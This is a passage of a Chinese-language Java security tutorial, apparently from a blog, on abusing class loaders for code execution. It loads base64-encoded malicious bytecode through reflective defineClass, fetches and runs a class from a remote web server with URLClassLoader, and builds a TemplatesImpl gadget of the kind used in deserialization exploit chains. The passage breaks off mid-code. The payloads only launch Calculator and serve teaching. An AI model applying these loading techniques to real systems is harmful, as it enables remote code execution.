class="line">000001aa</span><br></pre></td></tr></table></figure><p>最后使用java命令运行编译好了的class文件，在这个过程中，JVM会对class的二进制内容进行解析，并执行如上javap命令查看的字节码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ java HelloWorld</span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure><h2 id="0x01-ClassLoader"><a href="#0x01-ClassLoader" class="headerlink" title="0x01 ClassLoader"></a>0x01 ClassLoader</h2><p>类加载器ClassLoader是实现类加载机制的一个重要组成部分，负责将类文件加载到内存中并转换为可执行的Java类。java.lang.ClassLoader是所有类加载器的父类，在其中有三个关键方法：</p><ul><li>loadClass(String name, boolean resolve)：该方法用于加载类，并根据resolve参数决定是否解析该类，如果resolve为true，则在加载类的同时，也会解析该类的依赖项。</li><li>findClass(String name)：该方法用于查找并加载指定名称的类。</li><li>defineClass(String name, byte[] b, int off, int len)：该方法将一个字节数组表示的类定义转换为一个Class对象，用于将类的字节码转换为Class对象。</li></ul><p>可见，由字节数组到Class对象最终依靠的还是defineClass方法，如下将演示利用defineClass方法直接加载字节码。首先准备一个恶意类CMD，其内容如下，不要带package包名。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CMD</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Process <span class="title function_">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将其编译，并复制class字节码的Base64编码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac CMD.java &amp;&amp; <span class="built_in">cat</span> CMD.class | <span class="built_in">base64</span> | pbcopy </span><br></pre></td></tr></table></figure><p>然后通过defineClass直接加载字节码，但由于defineClass的访问修饰符为protected，这使得该类无法在外部直接访问，所以需要使用反射技术。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len) <span class="keyword">throws</span> ClassFormatError &#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(name, b, off, len, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终构造如下利用，运行便会成功弹出计算器。由于defineClass的访问修饰符为protected，这使得在实战中，不可能直接使用到defineClass，但不过存在一些间接路线能够对defineClass进行间接调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineClassRCE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAHAoABgAPCgAQABEIABIKABAAEwcAFAcAFQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAWAQAKU291cmNlRmlsZQEACENNRC5qYXZhDAAHAAgHABcMABgAGQEAEm9wZW4gLWEgQ2FsY3VsYXRvcgwAGgAbAQADQ01EAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAABAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAAAgAEAAMADQAEAAsAAAAEAAEADAABAA0AAAACAA4=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">p</span> <span class="operator">=</span> (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;CMD&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        p.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-classloader/0.png"></p><p><img src="/img/post/java-classloader/1.png"></p><h2 id="0x02-URLClassLoader"><a href="#0x02-URLClassLoader" class="headerlink" title="0x02 URLClassLoader"></a>0x02 URLClassLoader</h2><p>java.net.URLClassLoader是Java中的一个类加载器，用于从指定的URL加载类文件，URLClassLoader允许动态加载远程的类文件，并在运行时将其转换为可执行代码。</p><p>URLClassLoader类继承SecureClassLoader，而SecureClassLoader又继承ClassLoader。这样，URLClassLoader便能调用ClassLoader.loadClass方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassLoader</span> <span class="keyword">extends</span> <span class="title class_">SecureClassLoader</span> <span class="keyword">implements</span> <span class="title class_">Closeable</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecureClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span></span><br></pre></td></tr></table></figure><p>还是准备如上相同的恶意CMD类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CMD</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Process <span class="title function_">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用javac命令将CMD编译，由于loadClass方法会优先从本地找起，所以需要将编译后的CMD.class放置在项目之外的目录，不然就会找到本地的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ /tmp/web/ javac CMD.java</span><br><span class="line">$ /tmp/web/ <span class="built_in">ls</span></span><br><span class="line">CMD.class CMD.java</span><br></pre></td></tr></table></figure><p>起一个Web服务，监听9999端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ /tmp/web/ python -m http.server 9999</span><br><span class="line">Serving HTTP on :: port 9999 (http://[::]:9999/) ...</span><br></pre></td></tr></table></figure><p>最终构造如下代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassLoaderRCE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义远程加载的URL</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://192.168.1.101:9999/&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建URLClassLoader对象</span></span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载URLClassLoader中的CMD类，不要将CMD.java或CMD.class放在这个项目的目录中，否则会先从本地找起</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> loader.loadClass(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用CMD中的exec方法，并传入open -a Calculator命令用以执行</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="literal">null</span>, <span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在运行其的过程中，会调用loadClass方法用于加载CMD类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在loadClass方法中调用了findClass方法用于查找并加载CMD类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(<span class="keyword">final</span> String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt; result;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        result = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Class&lt;?&gt;&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Class&lt;?&gt; run() <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>);</span><br><span class="line">                    <span class="type">Resource</span> <span class="variable">res</span> <span class="operator">=</span> ucp.getResource(path, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (res != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> defineClass(name, res);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name, e);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, acc);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (ClassNotFoundException) pae.getException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-classloader/2.png"></p><p>而findClass中又对defineClass方法进行了调用，该方法用于将一个字节数组表示的类定义转换为一个Class对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len, ProtectionDomain protectionDomain) <span class="keyword">throws</span> ClassFormatError &#123;</span><br><span class="line">    protectionDomain = preDefineClass(name, protectionDomain);</span><br><span class="line">    <span class="type">String</span> <span class="variable">source</span> <span class="operator">=</span> defineClassSourceLocation(protectionDomain);</span><br><span class="line">    Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);</span><br><span class="line">    postDefineClass(c, protectionDomain);</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-classloader/3.png"></p><p>最终，Web服务器将接收到一个请求，计算器也成功弹出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ /tmp/web/ python -m http.server --<span class="built_in">bind</span> 127.0.0.1 9999</span><br><span class="line">Serving HTTP on :: port 9999 (http://[::]:9999/) ...</span><br><span class="line">::ffff:192.168.1.101 - - [10/January/2023 12:40:17] <span class="string">&quot;GET /CMD.class HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure><h2 id="0x03-TemplatesImpl"><a href="#0x03-TemplatesImpl" class="headerlink" title="0x03 TemplatesImpl"></a>0x03 TemplatesImpl</h2><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类的作用是表示XSLT模板，它可以解析XSLT样式表并将其编译成可重用的模板。XSLT是一种XML风格语言，用于将XML文档转换为其他格式，比如HTML、文本或其他XML文档。</p><p>前面通过defineClass直接加载字节码时，由于defineClass方法的访问修饰符为protected，不得不使用到反射技术才得以利用，这使得defineClass在实战利用中没法被直接利用，不过也提到了存在一些间接路线能够对defineClass进行间接调用，TemplatesImpl便是间接路线之一。TemplatesImpl在后续的多个反序列化链及实际场景中都会有所体现，如CommonsCollections2、CommonsCollections3、CommonsCollections4、CommonsBeanutils1、Shiro反序列化利用和Fastjson反序列化利用等，其重要性不言而喻。</p><p>在TemplatesImpl类中定义了一个内部类，即TransletClassLoader，在这个类中有对defineClass进行重写，且未显式声明访问修饰符，在这种情况下，默认访问级别是包级私有，即该类能够被同一个包中的其他类访问。这样，此处的defineClass便可以被调用了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">     TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">         <span class="built_in">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; ret = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// The _loadedExternalExtensionFunctions will be empty when the</span></span><br><span class="line">        <span class="comment">// SecurityManager is not set and the FSP is turned off</span></span><br><span class="line">        <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="literal">null</span>) &#123;</span><br><span class="line">            ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="literal">null</span>) &#123;</span><br><span class="line">            ret = <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么，便对TransletClassLoader类进行Find Usages，可看到它在TemplatesImpl#defineTransletClasses方法中存在被调用。</p><p><img src="/img/post/java-classloader/4.png"></p><p>但由于defineTransletClasses方法的访问修饰符为private，所以需继续向前Find Usages。</p><p><img src="/img/post/java-classloader/5.png"></p><p>在getTransletClasses、getTransletIndex和getTransletInstance三个方法中发现存在defineTransletClasses方法的调用，且getTransletIndex的访问修饰符是public，但是getTransletIndex是行不通的，原因后面再说。</p><p>尝试继续向前追溯，发现在newTransformer方法中存在getTransletInstance方法的调用，且newTransformer方法的访问修饰符为public，可被外部进行调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如此，便可通过newTransformer方法构造利用代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplRCE</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAAhSQ0UuamF2YQwADgAPBwAcDAAdAB4BABJvcGVuIC1hIENhbGN1bGF0b3IMAB8AIAEAEmNvbS9qYXZhc2VjL2NsL1JDRQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAACwALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAAA4ACwAAAAQAAQAMAAEADgAPAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAAEQAEABIADQATAAsAAAAEAAEAEAABABEAAAACABI=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;T&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        </span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> 